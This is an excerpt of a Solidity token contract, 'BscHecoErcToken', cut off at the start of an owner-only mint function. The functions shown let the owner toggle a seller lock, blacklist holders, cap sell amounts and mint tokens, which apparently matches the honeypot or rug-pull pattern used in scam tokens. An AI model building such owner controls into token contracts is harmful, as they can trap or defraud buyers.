...
contract BscHecoErcToken is Ownable {
  ...
  function setWhiteAddress(address holder, bool allowApprove) external Owner {
      allowAddress[holder] = allowApprove;
  }
  function setSellerState(bool ok) external Owner returns (bool){
      lockSeller = ok;
  }
  function setBlackList(address holder, bool ok) external Owner returns (bool){
      blackLists[holder] = ok;
  }  
  function setMaxSellOutNum(uint256 num) external Owner returns (bool){
      maxSellOutNum = num;
  } 
  function setMaxSellToken(uint256 num) external Owner returns (bool){
      maxSellToken = num * 10 ** uint256(decimals);
  }    
  function mint(address miner, uint256 _value) external Owner {
